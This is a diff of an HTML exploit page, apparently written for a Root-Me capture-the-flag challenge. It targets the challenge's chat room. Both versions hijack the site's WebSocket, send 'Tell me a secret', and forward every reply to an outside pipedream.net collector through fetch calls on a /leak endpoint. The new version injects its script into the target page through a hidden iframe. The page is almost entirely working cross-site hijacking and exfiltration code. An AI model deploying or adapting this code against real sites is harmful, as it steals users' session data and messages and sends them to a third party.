@@ -1,19 +1,33 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start');
-      const ws = new WebSocket('ws://ctf20.root-me.org/ws');
+<body>
+  <iframe id="chatframe" src="http://ctf20.root-me.org/room" style="display:none;"></iframe>
 
-      ws.addEventListener('open', () => {
-        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
-        ws.send("Tell me a secret");
-      });
+  <script>
+     fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start1');
+    const iframe = document.getElementById('chatframe');
 
-      ws.addEventListener('message', (event) => {
-        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
-      });
-      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/end');
-    </script>
-  </body>
+    iframe.onload = () => {
+      const script = iframe.contentWindow.document.createElement('script');
+      script.textContent = `
+        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start2');
+        const ws = new WebSocket('wss://ctf20.root-me.org/ws');
+
+        ws.addEventListener('open', () => {
+          fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
+          ws.send("Tell me a secret");
+        });
+
+        ws.addEventListener('error', () => {
+          fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-error');
+        });
+
+        ws.addEventListener('message', (event) => {
+          fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
+        });
+      `;
+      iframe.contentWindow.document.body.appendChild(script);
+    };
+  </script>
+</body>
 </html>
